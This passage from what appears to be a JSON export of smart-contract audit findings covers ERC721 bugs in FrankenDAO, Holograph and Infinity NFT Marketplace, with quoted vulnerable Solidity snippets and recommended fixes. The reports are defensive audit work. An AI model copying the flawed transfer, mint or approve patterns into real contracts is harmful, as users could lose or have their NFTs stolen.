            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ABI Encoding"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "0x"
          }
        }
      ]
    },
    {
      "id": "3595",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 6,
      "protocol_id": "103",
      "title": "M-3: Using `ERC721.transferFrom()` instead of `safeTransferFrom()` may cause the user's NFT to be frozen in a contract that does not support ERC721",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/55 \n\n## Found by \nsaian, rvierdiiev, WATCHPUG, Tomo, Bnke0x0, Nyx\n\n## Summary\n\nThere are certain smart contracts that do not support ERC721, using `transferFrom()` may result in the NFT being sent to such contracts.\n\n## Vulnerability Detail\n\nIn `unstake()`, `_to` is param from user's input.\n\nHowever, if `_to` is a contract address that does not support ERC721, the NFT can be frozen in that contract.\n\nAs per the documentation of EIP-721:\n\n> A wallet/broker/auction application MUST implement the wallet interface if it will accept safe transfers.\n\nRef: https://eips.ethereum.org/EIPS/eip-721\n\n## Impact\n\nThe NFT may get stuck in the contract that does support ERC721.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L463-L489\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider using `safeTransferFrom()` instead of `transferFrom()`.\n\n## Discussion\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/10",
      "summary": "\nThis bug report is about a vulnerability found in the smart contract code of the \"FrankenDAO\" project. The vulnerability is related to the use of `ERC721.transferFrom()` instead of `safeTransferFrom()` when sending a Non-Fungible Token (NFT). The issue was discovered by a group of people including saian, rvierdiiev, WATCHPUG, Tomo, Bnke0x0, Nyx. \n\nUsing `transferFrom()` may result in the NFT being sent to a contract that does not support ERC721, thus freezing the NFT in the contract. This is because, according to the EIP-721 documentation, a wallet, broker or auction application must implement the wallet interface if it will accept safe transfers.\n\nThe impact of this vulnerability is that the NFT may get stuck in the contract that does not support ERC721. The code snippet related to this issue can be found at the given link. The vulnerability was discovered through manual review and the recommended solution is to consider using `safeTransferFrom()` instead of `transferFrom()`. The issue was fixed by zobront and the fix can be found at the given link.",
      "report_date": {},
      "contest_prize_txt": "16000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/18",
      "sponsor_name": "3D FrankenPunks",
      "sponsor_link": "",
      "quality_score": 3,
      "general_score": 5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/55",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "18",
      "slug": "m-3-using-erc721transferfrom-instead-of-safetransferfrom-may-cause-the-users-nft-to-be-frozen-in-a-contract-that-does-not-support-erc721-sherlock-3d-frankenpunks-frankendao-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "FrankenDAO",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "FrankenDAO",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "transferFrom vs safeTransferFrom"
          }
        },
        {
          "tags_tag": {
            "title": "NFT"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "3593",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "103",
      "title": "M-1: [Tomo-M3] Use safeMint instead of mint for ERC721",
      "content": "Source: https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/65 \n\n## Found by \nTomo\n\n## Summary\n\nUse safeMint instead of mint for ERC721\n\n## Vulnerability Detail\n\nTheÂ `msg.sender`Â will be minted as a proof of staking NFT whenÂ `_stakeToken()`Â is called. \n\nHowever, ifÂ `msg.sender` is a contract address that does not support ERC721, the NFT can be frozen in the contract.\n\nAs per the documentation of EIP-721:\n\n> A wallet/broker/auction application MUST implement the wallet interface if it will accept safe transfers.\n> \n\nRef:Â [https://eips.ethereum.org/EIPS/eip-721](https://eips.ethereum.org/EIPS/eip-721)\n\nAs per the documentation of ERC721.sol by Openzeppelin\n\nRef: [https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L274-L285](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L274-L285)\n\n```solidity\n/**\n * @dev Mints `tokenId` and transfers it to `to`.\n *\n * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible\n *\n * Requirements:\n *\n * - `tokenId` must not exist.\n * - `to` cannot be the zero address.\n *\n * Emits a {Transfer} event.\n */\nfunction _mint(address to, uint256 tokenId) internal virtual {\n```\n\n## Impact\n\nUsers possibly lose their NFTs\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-frankendao/blob/main/src/Staking.sol#L411\n``` solidity\n  _mint(msg.sender, _tokenId);\n```\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse `safeMint` instead of `mint` to check received address support for ERC721 implementation.\n\n[https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L262](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L262)\n\n## Discussion\n\n**zobront**\n\nI might consider this a duplicate of #55 but not sure how this is usually judged. We will be changing this function based on other issues to not allow \"approved\" spenders, so msg.sender will be the owner of the FrankenPunk, which ensures they are able to hold NFTs.\n\n**zobront**\n\nFixed: https://github.com/Solidity-Guild/FrankenDAO/pull/14\n\nI didn't need to add safeMint, as I made a change for another issue that removed the ability to non holder to unstake, which means they have the ability to hold NFTs.",
      "summary": "\nThis bug report is about an issue found by Tomo in the code of the Sherlock Audit project. The issue is related to the minting of an ERC721 token when the _stakeToken() function is called. The problem is that if the `msg.sender` is a contract address that does not support ERC721, the token can be frozen in the contract. This could lead to users losing their NFTs. The code snippet provided is from the Staking.sol file, line 411, which shows the `_mint(msg.sender, _tokenId)` function.\n\nThe recommendation is to use the `safeMint` function instead of `mint` to check if the received address supports ERC721 implementation. This is in line with the documentation of EIP-721, which states that a wallet/broker/auction application must implement the wallet interface if it will accept safe transfers. The code for the `safeMint` function can be found in the ERC721.sol file by Openzeppelin.\n\nThe issue was fixed in the Pull Request #14 by zobront, who did not need to add `safeMint`, as they made a change for another issue that removed the ability to non-holder to unstake, which ensured they had the ability to hold NFTs.",
      "report_date": {},
      "contest_prize_txt": "16000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/18",
      "sponsor_name": "3D FrankenPunks",
      "sponsor_link": "",
      "quality_score": 3,
      "general_score": 5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-frankendao-judging/issues/65",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "18",
      "slug": "m-1-tomo-m3-use-safemint-instead-of-mint-for-erc721-sherlock-3d-frankenpunks-frankendao-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "FrankenDAO",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "FrankenDAO",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "mint vs safeMint"
          }
        },
        {
          "tags_tag": {
            "title": "NFT"
          }
        }
      ]
    },
    {
      "id": "5612",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "131",
      "title": "[M-19] `HolographERC721.approve` not EIP-721 compliant",
      "content": "\n[HolographERC721.sol#L272](https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L272)<br>\n\nAccording to EIP-721, we have for `approve`:\n\n```solidity\n///  Throws unless `msg.sender` is the current NFT owner, or an authorized\n///  operator of the current owner.\n```\n\nAn operator in the context of EIP-721 is someone who was approved via `setApprovalForAll`:\n\n```solidity\n/// @notice Enable or disable approval for a third party (\"operator\") to manage\n///  all of `msg.sender`'s assets\n/// @dev Emits the ApprovalForAll event. The contract MUST allow\n///  multiple operators per owner.\n/// @param _operator Address to add to the set of authorized operators\n/// @param _approved True if the operator is approved, false to revoke approval\nfunction setApprovalForAll(address _operator, bool _approved) external;\n```\n\nBesides operators, there are also approved addresses for a token (for which `approve` is used). However, approved addresses can only transfer the token, see for instance the `safeTransferFrom` description:\n\n```solidity\n/// @dev Throws unless `msg.sender` is the current owner, an authorized\n///  operator, or the approved address for this NFT.\n```\n\n`HolographERC721` does not distinguish between authorized operators and approved addresses when it comes to the `approve` function. Because `_isApproved(msg.sender, tokenId)` is used there, an approved address can approve another address, which is a violation of the EIP (only authorized operators should be able to do so).\n\n### Proof Of Concept\n\nBob calls `approve` to approve Alice on token ID 42 (that is owned by Bob). One week later, Bob sees that a malicious address was approved for his token ID 42 (e.g., because Alice got phished) and stole his token. Bob wonders how this is possible, because Alice should not have the permission to approve other addresses. However, becaue `HolographERC721` did not follow EIP-721, it was possible.\n\n### Recommended Mitigation Steps\n\nFollow the EIP, i.e. do not allow approved addresses to approve other addresses.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1307792766):**\n > Originally, this was a design decision, but we will update the highlighted code to follow the ERC721 spec to avoid unknown consequences.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1320957930):**\n > Consider as duplicate of [`#203`](https://github.com/code-423n4/2022-10-holograph-findings/issues/203)\n\n**[Lambda (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1322711108):**\n > @gzeon - Isn't this a different issue than [`#203`](https://github.com/code-423n4/2022-10-holograph-findings/issues/203)? Both are related to ERC721 compliance, but they have different causes (wrong `safeTransferFrom` vs. wrong `approve`), very different impacts (failing transfers vs. unintended permissions), and the sponsor will implement different fixes for them (that for instance would not make sense to review together in a fix review)\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1328124102):**\n > @Lambda - Fair.\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the HolographERC721 contract, which does not follow the EIP-721 standard for the `approve` function. According to the EIP-721, only authorized operators should be able to approve other addresses, but the contract does not distinguish between authorized operators and approved addresses. This means that approved addresses can approve other addresses, which can lead to malicious actors stealing tokens. The proof of concept given is an example of how this vulnerability can be exploited, and the recommended mitigation step is to follow the EIP-721 and not allow approved addresses to approve other addresses.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-10-holograph-contest",
      "sponsor_name": "Holograph",
      "sponsor_link": "https://twitter.com/holographxyz",
      "quality_score": 4,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/205",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "170",
      "slug": "m-19-holographerc721approve-not-eip-721-compliant-code4rena-holograph-holograph-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Holograph",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Holograph",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "Approve"
          }
        }
      ]
    },
    {
      "id": "5608",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "131",
      "title": "[M-15] `HolographERC721.safeTransferFrom` not compliant with EIP-721",
      "content": "\n[HolographERC721.sol#L366](https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L366)<br>\n\nAccording to EIP-721, we have the following for `safeTransferFrom`:\n\n```solidity\n///  (...) When transfer is complete, this function\n///  checks if `_to` is a smart contract (code size > 0). If so, it calls\n///  `onERC721Received` on `_to` and throws if the return value is not\n///  `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`.\n```\n\nAccording to the specification, the function must therefore always call `onERC721Received`, not only when it has determined via ERC-165 that the contract provides this function. Note that in the EIP, the provided interface for `ERC721TokenReceiver` does not mention ERC-165. For the token itself, we have: `interface ERC721 /* is ERC165 */ {`<br>\nHowever, for the receiver, the provided interface there is just: `interface ERC721TokenReceiver {`<br>\nThis leads to failed transfers when they should not fail, because many receivers will just implement the `onERC721Received` function (which is sufficient according to the EIP), and not `supportsInterface` for ERC-165 support.\n\n### Proof Of Concept\n\nLet's say a receiver just implements the `IERC721Receiver` from OpenZeppelin: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol><br>\nLike the provided interface in the EIP itself, this interface does not derive from EIP-165. All of these receivers (which are most receivers in practice) will not be able to receive those tokens, because the `require` statement (that checks for ERC-165 support) reverts.\n\n### Recommended Mitigation Steps\n\nRemove the ERC-165 check in the `require` statement (like OpenZeppelin does: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436>).\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/203#issuecomment-1307809122):**\n > This will be updated to be fully ERC721 compliant\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/203#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `safeTransferFrom` function in the HolographERC721.sol code. According to the EIP-721 specification, the function must always call `onERC721Received` when transferring tokens, not only when it has determined via ERC-165 that the contract provides this function. However, many receivers will just implement the `onERC721Received` function, and not `supportsInterface` for ERC-165 support, leading to failed transfers when they should not fail. The recommended mitigation step is to remove the ERC-165 check in the `require` statement.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-10-holograph-contest",
      "sponsor_name": "Holograph",
      "sponsor_link": "https://twitter.com/holographxyz",
      "quality_score": 4,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/203",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "170",
      "slug": "m-15-holographerc721safetransferfrom-not-compliant-with-eip-721-code4rena-holograph-holograph-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Holograph",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Holograph",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "EIP-165"
          }
        }
      ]
    },
    {
      "id": "5597",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "131",
      "title": "[M-04] Incorrect implementation of ERC721 may have bad consequences for receiver",
      "content": "\n[HolographERC721.sol#L467](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L467)<br>\n\nHolographERC721.sol is an enforcer contract that fully implements ERC721. In its safeTransferFromFunction there is the following code:\n\n    if (_isContract(to)) {\n      require(\n        (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&\n          ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&\n          ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==\n          ERC721TokenReceiver.onERC721Received.selector),\n        \"ERC721: onERC721Received fail\"\n      );\n    }\n\nIf the target address is a contract, the enforcer requires the target's `onERC721Received()` to succeed. However, the call deviates from the [standard](https://eips.ethereum.org/EIPS/eip-721):\n\n    interface ERC721TokenReceiver {\n        /// @notice Handle the receipt of an NFT\n        /// @dev The ERC721 smart contract calls this function on the recipient\n        ///  after a `transfer`. This function MAY throw to revert and reject the\n        ///  transfer. Return of other than the magic value MUST result in the\n        ///  transaction being reverted.\n        ///  Note: the contract address is always the message sender.\n        /// @param _operator The address which called `safeTransferFrom` function\n        /// @param _from The address which previously owned the token\n        /// @param _tokenId The NFT identifier which is being transferred\n        /// @param _data Additional data with no specified format\n        /// @return `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\n        ///  unless throwing\n        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4);\n    }\n\nThe standard mandates that the first parameter will be the operator - the caller of safeTransferFrom. The enforcer passes instead the `address(this)` value, in other words the Holographer address. The impact is that any bookkeeping done in target contract, and allow / disallow decision of the transaction, is based on false information.\n\n### Impact\n\nERC721 transferFrom's \"to\" contract may fail to accept transfers, or record credit of transfers incorrectly.\n\n### Recommended Mitigation Steps\n\nPass the msg.sender parameter, as the ERC721 standard requires.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/469#issuecomment-1306626633):**\n > This will be updated to pass msg.sender instead of Holograph address to match the standard.\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/469#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue found in the HolographERC721.sol contract, which is an enforcer contract that fully implements ERC721. The bug is related to the safeTransferFromFunction, in which the code deviates from the ERC721 standard. The standard requires that the first parameter should be the operator, but the enforcer passes the address(this) value instead. This means that any bookkeeping done in the target contract, and the decision of allowing or disallowing the transaction, is based on false information.\n\nThe impact of this bug is that the ERC721 transferFrom's \"to\" contract may fail to accept transfers, or record credit of transfers incorrectly. The bug was found through manual audit.\n\nThe recommended mitigation step for this bug is to pass the msg.sender parameter, as the ERC721 standard requires.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-10-holograph-contest",
      "sponsor_name": "Holograph",
      "sponsor_link": "https://twitter.com/holographxyz",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/469",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "170",
      "slug": "m-04-incorrect-implementation-of-erc721-may-have-bad-consequences-for-receiver-code4rena-holograph-holograph-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Holograph",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Holograph",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "2773",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 8,
      "protocol_id": "208",
      "title": "[H-07] `_transferNFTs()` succeeds even if no transfer is performed",
      "content": "_Submitted by k, also found by 0x29A, 0xf15ers, 0xsanson, antonttc, hyh, PwnedNoMore, and zzzitron_\n\nIf an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases:\n\n1.  A token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly.\n2.  An NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces.\n3.  A malicious contract that is deployed to take advantage of this behavior.\n\n### Proof of Concept\n\n<https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9>\n\n### Recommended Mitigation Steps\n\nIf neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1162963184):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1179596601):**\n> If `supportsInterface` returns false for both 721 & 1155 then no NFT is transferred but funds are still sent to the seller.\n> \n> A number of NFTs do not fully comply with the 721/1155 standards. Since the order is not canceled or the tx reverted, this seems like a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange.sol contract code on GitHub. If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. This means that the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This vulnerability can occur in the following cases: 1. a token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly; 2. an NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces; and 3. a malicious contract that is deployed to take advantage of this behavior. A proof of concept is provided to demonstrate the vulnerability. The recommended mitigation steps are to either revert if neither the ERC-721 nor the ERC-1155 interface is supported, or to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-06-infinity-nft-marketplace-contest",
      "sponsor_name": "Infinity NFT Marketplace",
      "sponsor_link": "https://twitter.com/infinitydotxyz",
      "quality_score": 4,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/87",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "136",
      "slug": "h-07-_transfernfts-succeeds-even-if-no-transfer-is-performed-code4rena-infinity-nft-marketplace-infinity-nft-marketplace-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Infinity NFT Marketplace",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Infinity NFT Marketplace",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Gaming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "2772",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "208",
      "title": "[H-06] Some real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`",
      "content": "_Submitted by PwnedNoMore_\n\nMany real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`, i.e., transferring less tokens than expected.\n\nFor example, the asset token of [The Sandbox Game](https://www.sandbox.game/en/), a Top20 ERC1155 token on [Etherscan](https://etherscan.io/tokens-nft1155?sort=7d\\&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and [implementation](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).\n\nAssuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by `InfinityExchange::_transferNFTs` which first checks ERC721 interface supports and then ERC1155.\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n```\n\nThe code will go into `_transferERC721s` instead of `_transferERC1155s`, since the Sandbox's ASSETs also support ERC721 interface. Then,\n\n```solidity\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n```\n\nSince the `ERC721(item.collection).safeTransferFrom` is treated as an ERC1155 transferring with one item ([reference](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.\n\nThat means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.\n\nNote that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.\n\n### Proof of Concept\n\nCheck the return values of [Sandbox's ASSETs](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s `supportInterface`, both `supportInterface(0x80ac58cd)` and `supportInterface(0xd9b67a26)` return true.\n\n### Recommended Mitigation Steps\n\nReorder the checks,e.g.,\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    }\n  }\n```\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1162965894):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760.\n\n**[HardlyDifficult 